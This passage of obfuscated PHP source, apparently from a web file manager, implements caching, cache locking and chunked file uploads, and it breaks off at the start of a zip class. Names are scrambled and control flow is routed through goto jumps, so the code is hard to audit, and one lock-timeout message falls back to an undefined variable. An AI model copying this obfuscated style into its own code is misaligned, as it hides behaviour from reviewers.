$DÜˆÜèÁõ[1098]) { $B± Ş”Ä§˜ = self::defaultDriverInit(); } else { if ($Dƒ…Ñ¿¤šø == $DÜˆÜèÁõ[1048] || $Dƒ…Ñ¿¤šø == $DÜˆÜèÁõ[1099]) { $B± Ş”Ä§˜ = IO::init($B± Ş”Ä§˜->pathParse[$DÜˆÜèÁõ[998]]); } } $Dƒ…Ñ¿¤šø = str_replace($DÜˆÜèÁõ[1096], $DÜˆÜèÁõ[33], strtolower($B± Ş”Ä§˜->getType())); if ($Dƒ…Ñ¿¤šø == $DÜˆÜèÁõ[102]) { return array($DÜˆÜèÁõ[29] => $DÜˆÜèÁõ[102], $DÜˆÜèÁõ[1093] => $DÜˆÜèÁõ[33], $DÜˆÜèÁõ[75] => $c‡å“¼ š¼); } goto Dà‘²ÙË¦»; Dà‘²ÙË¦»: return array($DÜˆÜèÁõ[29] => $DÜˆÜèÁõ[780], $DÜˆÜèÁõ[1093] => $B± Ş”Ä§˜->pathDriver, $DÜˆÜèÁõ[75] => $c‡å“¼ š¼); goto DÏ¶àÇ¥ò‘; DÏ¶àÇ¥ò‘: } } goto FØ“‘—÷Æç; CœÜª‘÷¦: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto b“İ¢©¥§ñ; b“İ¢©¥§ñ: $D–®‘‰ƒ =& $_SERVER[”Ì÷ñ­î¸]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto D¢Ç”½³æ; Fµ´²ƒŞ Ã: switch ($F¾ñº˜£œã[$D–®‘‰ƒ[755]]) { case $D–®‘‰ƒ[17]: self::$handle = Model($D–®‘‰ƒ[757]); break; case $D–®‘‰ƒ[758]: self::$handle = new CacheRedis($cï´ñÒ‘ó¿, $fŠèÇÂ¨·†); break; case $D–®‘‰ƒ[759]: self::$handle = new CacheMemcached($cï´ñÒ‘ó¿, $fŠèÇÂ¨·†); break; case $D–®‘‰ƒ[167]: self::$handle = new CacheFile($cï´ñÒ‘ó¿, $fŠèÇÂ¨·†); break; default: break; } return self::$handle; goto aêœ…š‚Î; D¢Ç”½³æ: $F¾ñº˜£œã = $GLOBALS[$D–®‘‰ƒ[6]][$D–®‘‰ƒ[337]]; $cï´ñÒ‘ó¿ = $F¾ñº˜£œã[$F¾ñº˜£œã[$D–®‘‰ƒ[755]]]; $fŠèÇÂ¨·† = $F¾ñº˜£œã[$D–®‘‰ƒ[756]]; goto Fµ´²ƒŞ Ã; aêœ…š‚Î: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Bô…Ù—Ÿ«) { if (is_array($Bô…Ù—Ÿ«) || is_object($Bô…Ù—Ÿ«)) { $Bô…Ù—Ÿ« = json_encode($Bô…Ù—Ÿ«); } $Bô…Ù—Ÿ« = rawurlencode($Bô…Ù—Ÿ«); return KOD_SITE_ID . $_SERVER[”Ì÷ñ­î¸][70] . $Bô…Ù—Ÿ«; } public static function get($AÛ¬‹ÅÓ÷â) { $eŠ÷ó½ƒË = self::key($AÛ¬‹ÅÓ÷â); if (!isset(self::$memoryCache[$eŠ÷ó½ƒË])) { $BÖÃ¢ßƒÎÄ = self::init()->get($eŠ÷ó½ƒË); self::$memoryCache[$eŠ÷ó½ƒË] = unserialize($BÖÃ¢ßƒÎÄ); } return self::$memoryCache[$eŠ÷ó½ƒË]; } public static function set($C­Î¤Úî†•, $BÂ„¯ªãï, $F÷—¸ÒÎ´ = false) { goto a¡êëÊµÙÆ; a¡êëÊµÙÆ: $F×©½Ë´ãâ = self::key($C­Î¤Úî†•); if (isset(self::$memoryCache[$F×©½Ë´ãâ]) && self::$memoryCache[$F×©½Ë´ãâ] === $BÂ„¯ªãï) { return !0; } if ($F÷—¸ÒÎ´ === 0) { self::$memoryCache[$F×©½Ë´ãâ] = $BÂ„¯ªãï; return !0; } goto AôëÚ•—Œ; AôëÚ•—Œ: CacheLock::lock($C­Î¤Úî†•); $fÓ§‡ òó = self::init()->set($F×©½Ë´ãâ, serialize($BÂ„¯ªãï), $F÷—¸ÒÎ´); self::$memoryCache[$F×©½Ë´ãâ] = $BÂ„¯ªãï; goto FğÇ‹é“µÅ; FğÇ‹é“µÅ: CacheLock::unlock($C­Î¤Úî†•); return $fÓ§‡ òó; goto c‡–‚Éé¸Ñ; c‡–‚Éé¸Ñ: } public static function remove($BÔÂŸ¸º‚Ğ) { goto A¸ˆ®ƒ¿Ú®; bø‚â÷Üæ‘: return $CÏ÷Ğš¡í; goto b‰Í‰¤Æ; EØ±ĞÛÎè”: CacheLock::lock($BÔÂŸ¸º‚Ğ); $CÏ÷Ğš¡í = self::init()->remove($a³–¬¶¸ÊÙ); CacheLock::unlock($BÔÂŸ¸º‚Ğ); goto bø‚â÷Üæ‘; A¸ˆ®ƒ¿Ú®: $a³–¬¶¸ÊÙ = self::key($BÔÂŸ¸º‚Ğ); unset(self::$memoryCache[$a³–¬¶¸ÊÙ]); self::clearTimeout(); goto EØ±ĞÛÎè”; b‰Í‰¤Æ: } public static function clearMemory($eÕìÍÉ°·î = false) { if ($eÕìÍÉ°·î) { $eÕìÍÉ°·î = self::key($eÕìÍÉ°·î); unset(self::$memoryCache[$eÕìÍÉ°·î]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[”Ì÷ñ­î¸][760])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[”Ì÷ñ­î¸][761])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($DÜ†›œ—‘, $cÊ¯†§ô¸›) { $E¦Ê—ñ…·— =& $_SERVER[”Ì÷ñ­î¸]; $this->cachePath = $DÜ†›œ—‘[$E¦Ê—ñ…·—[75]]; $this->prefix = $E¦Ê—ñ…·—[762]; $this->cacheTime = $cÊ¯†§ô¸›; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($B‹ÕÇãÆë±) { $b£œÖµâèÚ =& $_SERVER[”Ì÷ñ­î¸]; $B‹ÕÇãÆë± = str_replace(array($b£œÖµâèÚ[763], $b£œÖµâèÚ[93], $b£œÖµâèÚ[69]), $b£œÖµâèÚ[764], $B‹ÕÇãÆë±); return $this->cachePath . $b£œÖµâèÚ[765] . $B‹ÕÇãÆë± . $b£œÖµâèÚ[766]; } public function set($A¥´­ç«Ñî, $b£¤»¡óõ, $Cö®³¹’™ø = false) { $AªÛ‹öŸ‘ = $this->getFile($A¥´­ç«Ñî); if (file_put_contents($AªÛ‹öŸ‘, $this->prefix . $b£¤»¡óõ, LOCK_EX)) { return !0; } @unlink($AªÛ‹öŸ‘); return !1; } public function get($Dà›ôö³”) { $A¿ã­¨›– = $this->getFile($Dà›ôö³”); if (file_exists($A¿ã­¨›–) && filemtime($A¿ã­¨›–) < time() - $this->cacheTime) { @unlink($A¿ã­¨›–); return !1; } $cóœ÷Óã = @file_get_contents($A¿ã­¨›–); return substr($cóœ÷Óã, strlen($this->prefix)); } public function remove($f‘¥¼ö§ó´) { $cÉƒÏ³’±¶ = $this->getFile($f‘¥¼ö§ó´); return @unlink($cÉƒÏ³’±¶); } public function deleteAll() { $eíÀó»¦Ä“ =& $_SERVER[”Ì÷ñ­î¸]; $aèé©Ñ‰ = scandir($this->cachePath); foreach ($aèé©Ñ‰ as $C·‡óäÅÈ) { $DˆŞÑ·ÕÑÖ = $this->cachePath . $C·‡óäÅÈ; if (strpos($DˆŞÑ·ÕÑÖ, $eíÀó»¦Ä“[766]) && strpos($DˆŞÑ·ÕÑÖ, $eíÀó»¦Ä“[767])) { @unlink($DˆŞÑ·ÕÑÖ); } } } public function clearTimeout() { $Cù»µ¯ª =& $_SERVER[”Ì÷ñ­î¸]; $AˆÒ”ëæ†Š = scandir($this->cachePath); foreach ($AˆÒ”ëæ†Š as $a·ËÏ¤¼İ•) { $AÁõÆ•¹ÄŠ = $this->cachePath . $a·ËÏ¤¼İ•; if (strpos($AÁõÆ•¹ÄŠ, $Cù»µ¯ª[766]) && strpos($AÁõÆ•¹ÄŠ, $Cù»µ¯ª[767]) && filemtime($AÁõÆ•¹ÄŠ) < time() - $this->cacheTime) { @unlink($AÁõÆ•¹ÄŠ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto D‹…ùø’¼‹; A©„´õÑ»ƒ: self::$timeout = $B½ÀêóŒÛŞ[$CÌğ£Õ’ÄĞ[768]] ? $B½ÀêóŒÛŞ[$CÌğ£Õ’ÄĞ[768]] : 10; $eªĞ¥ó¾ùç = _get($GLOBALS[$CÌğ£Õ’ÄĞ[6]], $CÌğ£Õ’ÄĞ[769]); $fªÁÇµŞ…ù = $B½ÀêóŒÛŞ[$CÌğ£Õ’ÄĞ[755]] ? $B½ÀêóŒÛŞ[$CÌğ£Õ’ÄĞ[755]] : $CÌğ£Õ’ÄĞ[167]; goto D‹ôâ…ë§×; D‹ôâ…ë§×: if ($fªÁÇµŞ…ù == $CÌğ£Õ’ÄĞ[17] && $eªĞ¥ó¾ùç == $CÌğ£Õ’ÄĞ[9]) { $fªÁÇµŞ…ù = $CÌğ£Õ’ÄĞ[167]; } switch ($fªÁÇµŞ…ù) { case $CÌğ£Õ’ÄĞ[758]: self::$handle = new CacheLockRedis(); break; case $CÌğ£Õ’ÄĞ[759]: self::$handle = new CacheLockMemcached(); break; case $CÌğ£Õ’ÄĞ[17]: self::$handle = new CacheLockDatabase(); break; case $CÌğ£Õ’ÄĞ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto F¡¨©Ñ¤ó÷; D‹…ùø’¼‹: $CÌğ£Õ’ÄĞ =& $_SERVER[”Ì÷ñ­î¸]; if (self::$handle) { return self::$handle; } $B½ÀêóŒÛŞ = $GLOBALS[$CÌğ£Õ’ÄĞ[6]][$CÌğ£Õ’ÄĞ[337]]; goto A©„´õÑ»ƒ; F¡¨©Ñ¤ó÷: } private static function key($F™¼£Ÿ¶Œ¾) { return $_SERVER[”Ì÷ñ­î¸][770] . Cache::key($F™¼£Ÿ¶Œ¾); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FÊÅ†«‚• = '') { self::$errorMsg = $FÊÅ†«‚•; } public static function lockGlobal($e–èŒ’ÙÛÉ, $f³ö…¡Å®) { return self::lock($e–èŒ’ÙÛÉ, $f³ö…¡Å®, !0); } public static function lock($dš„àÅÕÌ–, $AÌ«ÃŠê¸´ = false, $aÊ»§ç‡ô = false) { goto cö¥ºÒ‚ŸÅ; Eë©æÜ¥ÔĞ: if (!$aÊ»§ç‡ô) { self::$lockItem[$bš¥š‰†ƒ] = !0; } return $D‹Š²ÕºŞœ; goto c…Œ¨ãù; A†·äƒ¸‚: $AÌ«ÃŠê¸´ = $AÌ«ÃŠê¸´ ? $AÌ«ÃŠê¸´ : self::$timeout; $D‹Š²ÕºŞœ = $b‚Ã‚›·í->lock($bš¥š‰†ƒ, $AÌ«ÃŠê¸´); if (!$D‹Š²ÕºŞœ) { $DÜ¹ÒŒŞ… = $cöÏÅØÆš¬[771] . $AÌ«ÃŠê¸´ . $cöÏÅØÆš¬[67] . self::$errorMsg . $cöÏÅØÆš¬[67] . get_caller_msg(); $e­îØ‘í¸ = "\114\157\x63\x6b\x20\141\x63\x74\151\157\x6e\72\40{$bš¥š‰†ƒ}\x20\164\151\x6d\x65\157\x75\164\x2c\157\166\145\162\x20{$AÌ«ÃŠê¸´}\x20\x73"; $e­îØ‘í¸ = self::$errorMsg ? self::$errorMsg : $D´•–«…™Š; write_log($DÜ¹ÒŒŞ…, $cöÏÅØÆš¬[772]); show_json($e­îØ‘í¸, !1); } goto Eë©æÜ¥ÔĞ; cö¥ºÒ‚ŸÅ: $cöÏÅØÆš¬ =& $_SERVER[”Ì÷ñ­î¸]; $b‚Ã‚›·í = self::init(); $bš¥š‰†ƒ = self::key($dš„àÅÕÌ–); goto A†·äƒ¸‚; c…Œ¨ãù: } public static function lockGet($DÂ×æ³ÆëŞ) { $Cå©Ú› ‹· = self::key($DÂ×æ³ÆëŞ); if (self::$lockItem[$Cå©Ú› ‹·]) { return self::$lockItem[$Cå©Ú› ‹·]; } return self::init()->lockGet($Cå©Ú› ‹·); } public static function unlock($EôÄ±·ï¤×) { $aÂÚ‹÷³œƒ = self::key($EôÄ±·ï¤×); self::$lockItem[$aÂÚ‹÷³œƒ] = null; return self::init()->unlock($aÂÚ‹÷³œƒ); } public static function unlockRuntime() { $Aå£††šÊö =& $_SERVER[”Ì÷ñ­î¸]; $F×„ùÊ¿ª = self::init(); $cİ£ç·Ô„£ = !1; foreach (self::$lockItem as $A½ƒ•¤ª¤ => $BÇÒ‘­İÎ‘) { if (!$BÇÒ‘­İÎ‘) { continue; } $F×„ùÊ¿ª->unlock($A½ƒ•¤ª¤); if (!$cİ£ç·Ô„£) { $cİ£ç·Ô„£ = !0; write_log($Aå£††šÊö[773] . $A½ƒ•¤ª¤ . $Aå£††šÊö[67] . get_caller_msg(), $Aå£††šÊö[772]); continue; } write_log($Aå£††šÊö[773] . $A½ƒ•¤ª¤, $Aå£††šÊö[772]); } } } goto d£„ö‘ñ³; c…ŞÆˆ·âÜ: if (class_exists($_SERVER[”Ì÷ñ­î¸][1968])) { class Services_JSON_Error extends PEAR_Error { function __construct($F ìÖöœ– = "\165\x6e\x6b\x6e\x6f\167\x6e\40\145\162\x72\x6f\162", $DÌ†²—˜Ä» = null, $Dï˜Ä«— = null, $fäÉ›Ã¡¤Â = null, $eÃø•…’´ = null) { parent::PEAR_Error($F ìÖöœ–, $DÌ†²—˜Ä», $Dï˜Ä«—, $fäÉ›Ã¡¤Â, $eÃø•…’´); } } } else { class Services_JSON_Error { function __construct($CİÒÉ¨¹ßÅ = "\165\156\153\156\157\167\156\x20\145\x72\162\x6f\x72", $bÙ¬ì‡¼ÜÃ = null, $däëå—ï¿‡ = null, $f©ãÄƒåŠÊ = null, $D¦ã ÏØÎ¦ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto DàÄ¨àğó; DàÄ¨àğó: $A§Æ“¹Œ =& $_SERVER[”Ì÷ñ­î¸]; global $in; $this->in =& $in; goto B¿Æî‰¦Ï‰; B¿Æî‰¦Ï‰: if (!empty($_FILES)) { $eˆÕ„Ëá = $_FILES[$A§Æ“¹Œ[167]]; $this->uploadFile = $eˆÕ„Ëá[$A§Æ“¹Œ[1969]]; if (!$this->uploadFile && $eˆÕ„Ëá[$A§Æ“¹Œ[1221]] > 0) { show_json($this->errorInfo($eˆÕ„Ëá[$A§Æ“¹Œ[1221]]), !1); } } else { if (isset($in[$A§Æ“¹Œ[386]])) { $this->uploadFile = isset($in[$A§Æ“¹Œ[1970]]) ? $A§Æ“¹Œ[1971] : $A§Æ“¹Œ[1816]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Eêİğ¨¹Š„; Eêİğ¨¹Š„: $this->checkSize(); $this->tempPathInit(); goto C””ä†‹¤à; C””ä†‹¤à: } public function upload() { goto c¬ì“İ‘·; E÷¾ñ•àÍñ: $fÎ²é¸Œ[$FŸêŒµ•‡‚[1982]][$FŸêŒµ•‡‚[1983] . $BŒíòôÑ½] = array($FŸêŒµ•‡‚[1984] => $dÀŸ†ÒèäĞ, $FŸêŒµ•‡‚[1036] => $BŒíòôÑ½, $FŸêŒµ•‡‚[77] => $CÂÈõ¢Î…Œ, $FŸêŒµ•‡‚[164] => $AÌá¡¿É±); $this->statusSet($fÎ²é¸Œ); if (count($fÎ²é¸Œ[$FŸêŒµ•‡‚[1982]]) != $fÎ²é¸Œ[$FŸêŒµ•‡‚[1981]]) { $this->showJson($FŸêŒµ•‡‚[1985] . $BŒíòôÑ½, !0); } goto D„ù¦ÓåÈÎ; e¬ØŒöóº¥: @unlink($D‹­²ÅÖ‘Ú); if (!$E’Ü‹¿ˆÌÁ) { $this->showJson($FŸêŒµ•‡‚[1980] . $BŒíòôÑ½, !1); } $fÎ²é¸Œ[$FŸêŒµ•‡‚[1981]] = $A‰ïÆ´Éá¿; goto E÷¾ñ•àÍñ; d‰º‚’Áğ±: $D‹­²ÅÖ‘Ú = $this->moveUploadedFile($dÕˆ¶—èô÷); if ($CÂÈõ¢Î…Œ > 0 && filesize($D‹­²ÅÖ‘Ú) == 0) { $this->showJson($FŸêŒµ•‡‚[1977], !1); } if (!$D‹­²ÅÖ‘Ú) { $this->showJson(LNG($FŸêŒµ•‡‚[1978]), !1); } goto aÑ˜¨ÁÕáØ; f¢æ×‹Ü£¥: if ($A‰ïÆ´Éá¿ > 1 && $EÃËèƒãÖí <= 0) { show_json($FŸêŒµ•‡‚[1976], !1); } if ($EÃËèƒãÖí > $CÂÈõ¢Î…Œ) { $A‰ïÆ´Éá¿ = 1; } if ($A‰ïÆ´Éá¿ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto a’„ñâ¡ê; aÑ˜¨ÁÕáØ: $dÀŸ†ÒèäĞ = $BŒíòôÑ½ * $EÃËèƒãÖí; $còŠ¼²ù¦¶ = @fopen($this->tempFile, $FŸêŒµ•‡‚[1979]); fseek($còŠ¼²ù¦¶, $dÀŸ†ÒèäĞ); goto F©˜ëˆ†â; A¼©ö³²×ï: $dÕˆ¶—èô÷ = $this->tempFile . $FŸêŒµ•‡‚[1974] . $BŒíòôÑ½; $CÂÈõ¢Î…Œ = isset($this->in[$FŸêŒµ•‡‚[520]]) ? intval($this->in[$FŸêŒµ•‡‚[520]]) : 0; $EÃËèƒãÖí = isset($this->in[$FŸêŒµ•‡‚[1975]]) ? intval($this->in[$FŸêŒµ•‡‚[1975]]) : 0; goto f¢æ×‹Ü£¥; D„ù¦ÓåÈÎ: ignore_timeout(); if (!$this->checkChunkHash($fÎ²é¸Œ)) { $this->showJson($FŸêŒµ•‡‚[1986], !1); } $this->statusSet(!1); goto Díµ¶îãÓ§; F©˜ëˆ†â: $E’Ü‹¿ˆÌÁ = $this->writeTo($D‹­²ÅÖ‘Ú, $còŠ¼²ù¦¶, $this->tempFile); $AÌá¡¿É± = IO::hashSimple($D‹­²ÅÖ‘Ú); $CÂÈõ¢Î…Œ = IO::size($D‹­²ÅÖ‘Ú); goto e¬ØŒöóº¥; a’„ñâ¡ê: CacheLock::lock($this->tempFile, 20); $fÎ²é¸Œ = $this->statusGet(); $this->initFileTemp(); goto d‰º‚’Áğ±; Díµ¶îãÓ§: CacheLock::unlock($this->tempFile); return $this->tempFile; goto dÅŸ¸³îš”; c¬ì“İ‘·: $FŸêŒµ•‡‚ =& $_SERVER[”Ì÷ñ­î¸]; $BŒíòôÑ½ = isset($this->in[$FŸêŒµ•‡‚[1972]]) ? intval($this->in[$FŸêŒµ•‡‚[1972]]) : 0; $A‰ïÆ´Éá¿ = isset($this->in[$FŸêŒµ•‡‚[1973]]) ? intval($this->in[$FŸêŒµ•‡‚[1973]]) : 1; goto A¼©ö³²×ï; dÅŸ¸³îš”: } private function checkSize() { $D¤à–˜Üùš =& $_SERVER[”Ì÷ñ­î¸]; if (phpBuild64() || $this->in[$D¤à–˜Üùš[77]] < PHP_INT_MAX) { return; } show_json(LNG($D¤à–˜Üùš[1987]), !1); } private function showJson($bæ¨ùŠšÅ, $aé¦Éàé) { CacheLock::unlock($this->tempFile); if (!$aé¦Éàé) { return show_json($bæ¨ùŠšÅ, $aé¦Éàé); } show_json($bæ¨ùŠšÅ, $aé¦Éàé); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto b·²æ«±Êî; b·²æ«±Êî: $BŞç°êàßà =& $_SERVER[”Ì÷ñ­î¸]; $e¤„œ£³’î = TEMP_FILES; @mk_dir($e¤„œ£³’î); goto dòÑí™•šÊ; dòÑí™•šÊ: touch($e¤„œ£³’î . $BŞç°êàßà[1988]); $aÕ†¼á«®» = isset($this->in[$BŞç°êàßà[1989]]) ? $this->in[$BŞç°êàßà[1989]] : !1; if (strlen($aÕ†¼á«®») < 30) { $aÕ†¼á«®» = md5(USER_ID . $this->in[$BŞç°êàßà[75]] . $this->fileName . $this->in[$BŞç°êàßà[77]]); } goto Dè‹Ñóšò¶; Dè‹Ñóšò¶: $this->tempFile = $e¤„œ£³’î . $BŞç°êàßà[1990] . md5($aÕ†¼á«®» . $this->in[$BŞç°êàßà[1534]]); goto DÎ»ºğ­™¤; DÎ»ºğ­™¤: } private function moveUploadedFile($aƒ„¨ÃÏâÑ) { $C”›•–½‰ =& $_SERVER[”Ì÷ñ­î¸]; $C»Ò¹¢Ç¡Õ = $this->uploadFile; if ($C»Ò¹¢Ç¡Õ == $C”›•–½‰[1991]) { @file_put_contents($aƒ„¨ÃÏâÑ, base64_decode($_REQUEST[$C”›•–½‰[1992]])); } else { if ($C»Ò¹¢Ç¡Õ == $C”›•–½‰[1816]) { $eÓ‹ ½‰¡’ = @fopen($aƒ„¨ÃÏâÑ, $C”›•–½‰[1524]); $this->writeTo($C»Ò¹¢Ç¡Õ, $eÓ‹ ½‰¡’, $aƒ„¨ÃÏâÑ); } else { if (!move_uploaded_file($C»Ò¹¢Ç¡Õ, $aƒ„¨ÃÏâÑ)) { return !1; } } } return $aƒ„¨ÃÏâÑ; } private function writeTo($fÙé½¨£Ê†, $C¤¤˜ÎÀìí, $D³“ïÅì‰™) { goto aÅª»ÅÔÎÌ; aÅª»ÅÔÎÌ: $A¦ñ¢î¬¡° =& $_SERVER[”Ì÷ñ­î¸]; $dâ®ÉÁ« = $A¦ñ¢î¬¡°[1993] . $D³“ïÅì‰™; $Aè¼Â¹±‡Œ = CacheLock::lock($dâ®ÉÁ«, 1); goto a‰âµŸ’²×; CáøÄ›â»: fclose($f™˜°ëâ¦); fclose($C¤¤˜ÎÀìí); CacheLock::unlock($dâ®ÉÁ«); goto f¤Ş¯›Şç ; f¤Ş¯›Şç : return !0; goto bÃĞÔÉìÛÁ; a‰âµŸ’²×: $f™˜°ëâ¦ = @fopen($fÙé½¨£Ê†, $A¦ñ¢î¬¡°[1523]); if (!$f™˜°ëâ¦ || !$C¤¤˜ÎÀìí || !$Aè¼Â¹±‡Œ) { CacheLock::unlock($dâ®ÉÁ«); return !1; } while (!feof($f™˜°ëâ¦)) { fwrite($C¤¤˜ÎÀìí, fread($f™˜°ëâ¦, 1024 * 200)); } goto CáøÄ›â»; bÃĞÔÉìÛÁ: } private function statusGet() { goto e¾ğ‹³Ä±İ; A˜ÂÅ¾îªĞ: if (!$this->statusData) { $Eë÷‚½¶å  = array($d¹ÍšãáÀè[28] => $this->fileName, $d¹ÍšãáÀè[1981] => 0, $d¹ÍšãáÀè[1982] => array()); $this->statusSet($Eë÷‚½¶å ); } return $this->statusData; goto E¸èë¥ä»; e¾ğ‹³Ä±İ: $d¹ÍšãáÀè =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($this->statusData)) { return $this->statusData; } $B¤³òí…Ÿ = $this->tempFile . $d¹ÍšãáÀè[1994]; goto CËãµ—ù¾†; CËãµ—ù¾†: $fì…îöæƒÚ = !1; if (file_exists($B¤³òí…Ÿ)) { $fì…îöæƒÚ = @file_get_contents($B¤³òí…Ÿ); } if ($fì…îöæƒÚ) { $this->statusData = json_decode($fì…îöæƒÚ, !0); } goto A˜ÂÅ¾îªĞ; E¸èë¥ä»: } public function statusSet($CÜ°Æ£„¯Ş) { $B¯‡¾—ëĞ = $this->tempFile . $_SERVER[”Ì÷ñ­î¸][1994]; if (!$CÜ°Æ£„¯Ş) { if (file_exists($B¯‡¾—ëĞ)) { @unlink($B¯‡¾—ëĞ); } return !0; } $this->statusData = $CÜ°Æ£„¯Ş; return file_put_contents($B¯‡¾—ëĞ, json_encode($CÜ°Æ£„¯Ş)); } private function initFileTemp() { $a›šœÚÛÏ° =& $_SERVER[”Ì÷ñ­î¸]; if (file_exists($this->tempFile)) { return; } $eŠÅšÙ˜°ø = fopen($this->tempFile, $a›šœÚÛÏ°[1995]); fseek($eŠÅšÙ˜°ø, $this->in[$a›šœÚÛÏ°[77]] - 1, SEEK_SET); fwrite($eŠÅšÙ˜°ø, $a›šœÚÛÏ°[468]); fclose($eŠÅšÙ˜°ø); } public function checkChunk() { goto Dà˜¦ÍÒÄÉ; Dà˜¦ÍÒÄÉ: $f¡Šóôñ’ =& $_SERVER[”Ì÷ñ­î¸]; $CãÜ×š‡ë™ = array(); CacheLock::lock($this->tempFile); goto cÔ–È‡Øï; F®Ö¥Ú‹†‡: return $CãÜ×š‡ë™; goto DÛˆÜ§³˜Ç; cÔ–È‡Øï: $e®Ù¿‹À„³ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($e®Ù¿‹À„³[$f¡Šóôñ’[1982]] as $B›¸¶æ‹òÙ) { $Eõ›ëÊ‚‰Ã = $B›¸¶æ‹òÙ[$f¡Šóôñ’[164]]; if ($Eõ›ëÊ‚‰Ã) { $CãÜ×š‡ë™[$f¡Šóôñ’[1996] . $B›¸¶æ‹òÙ[$f¡Šóôñ’[1036]]] = $Eõ›ëÊ‚‰Ã; } } goto F®Ö¥Ú‹†‡; DÛˆÜ§³˜Ç: } private function checkChunkHash($b½¼¹Ó‰Æá) { goto bµğ¶¨ÂÁ˜; dˆ¨Ÿ×¢¡Â: $CòîÖ×½…Ü = _get($this->in, $B¾á‡ñÜÏÓ[1997]); if (strlen($CòîÖ×½…Ü) == 32 && IO::hashSimple($this->tempFile) == $CÏÉÆĞ‹®’ && IO::hashMd5($this->tempFile) == $CòîÖ×½…Ü) { return !0; } $Aî‰†¹ßÉ… = fopen($this->tempFile, $B¾á‡ñÜÏÓ[1172]); goto EĞõÍ¾ãÊ; dÇÜíß¹õ‹: return $a®ÒĞ¹¯; goto D×¼ã½–Ö; EĞõÍ¾ãÊ: $a®ÒĞ¹¯ = !0; foreach ($b½¼¹Ó‰Æá[$B¾á‡ñÜÏÓ[1982]] as $E«Ú¬†Ç¯Œ) { fseek($Aî‰†¹ßÉ…, $E«Ú¬†Ç¯Œ[$B¾á‡ñÜÏÓ[1984]]); $Eˆ³ïÔ±¾ó = PathDriverStream::hash($Aî‰†¹ßÉ…, $E«Ú¬†Ç¯Œ[$B¾á‡ñÜÏÓ[77]]); if ($E«Ú¬†Ç¯Œ[$B¾á‡ñÜÏÓ[164]] != $Eˆ³ïÔ±¾ó) { $a®ÒĞ¹¯ = !1; break; } } fclose($Aî‰†¹ßÉ…); goto dÇÜíß¹õ‹; bµğ¶¨ÂÁ˜: $B¾á‡ñÜÏÓ =& $_SERVER[”Ì÷ñ­î¸]; if (count($b½¼¹Ó‰Æá[$B¾á‡ñÜÏÓ[1982]]) != $b½¼¹Ó‰Æá[$B¾á‡ñÜÏÓ[1981]]) { return !1; } $CÏÉÆĞ‹®’ = _get($this->in, $B¾á‡ñÜÏÓ[1989]); goto dˆ¨Ÿ×¢¡Â; D×¼ã½–Ö: } public static function fileName() { goto AâÍ’„µø; AâÍ’„µø: $bàƒ‰³–ê¼ =& $_SERVER[”Ì÷ñ­î¸]; global $in; $cÀ‘¦ÁÍËß = isset($in[$bàƒ‰³–ê¼[28]]) ? $in[$bàƒ‰³–ê¼[28]] : $bàƒ‰³–ê¼[33]; goto b™šî­‰ò; dªØçà ¸Å: return KodIO::clear($cÀ‘¦ÁÍËß); goto côÄ”¿Ò´; b™šî­‰ò: if (!empty($_FILES)) { $cÀ‘¦ÁÍËß = $cÀ‘¦ÁÍËß ? $cÀ‘¦ÁÍËß : $_FILES[$bàƒ‰³–ê¼[167]][$bàƒ‰³–ê¼[386]]; } if (!is_wap()) { return KodIO::clear($cÀ‘¦ÁÍËß); } $Fª÷‹™¥ğæ = strtotime($in[$bàƒ‰³–ê¼[1998]]); goto dĞİ ¼Ã†Ù; dĞİ ¼Ã†Ù: $Fª÷‹™¥ğæ = $Fª÷‹™¥ğæ ? $Fª÷‹™¥ğæ : time(); $f•‡ê´Ù‡è = strtolower($cÀ‘¦ÁÍËß); if ($f•‡ê´Ù‡è == $bàƒ‰³–ê¼[1999] || $f•‡ê´Ù‡è == $bàƒ‰³–ê¼[2000]) { $cÀ‘¦ÁÍËß = date($bàƒ‰³–ê¼[691], $Fª÷‹™¥ğæ) . $bàƒ‰³–ê¼[70] . $in[$bàƒ‰³–ê¼[77]] . $bàƒ‰³–ê¼[1631]; } else { if ($f•‡ê´Ù‡è == $bàƒ‰³–ê¼[2001]) { $cÀ‘¦ÁÍËß = date($bàƒ‰³–ê¼[691], $Fª÷‹™¥ğæ) . $bàƒ‰³–ê¼[70] . $in[$bàƒ‰³–ê¼[77]] . $bàƒ‰³–ê¼[2002]; } } goto dªØçà ¸Å; côÄ”¿Ò´: } private function errorInfo($F¥ˆååñ¤ƒ) { $b¼˜ØŠØÃÊ =& $_SERVER[”Ì÷ñ­î¸]; $D …ğàİôò = array($b¼˜ØŠØÃÊ[2003], $b¼˜ØŠØÃÊ[2004], $b¼˜ØŠØÃÊ[2005], $b¼˜ØŠØÃÊ[2006], $b¼˜ØŠØÃÊ[2007], $b¼˜ØŠØÃÊ[2008], $b¼˜ØŠØÃÊ[2009], $b¼˜ØŠØÃÊ[2010]); return $F¥ˆååñ¤ƒ . $b¼˜ØŠØÃÊ[4] . $D …ğàİôò[$F¥ˆååñ¤ƒ]; } } class ZipMake { const VERSION = "\60\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const 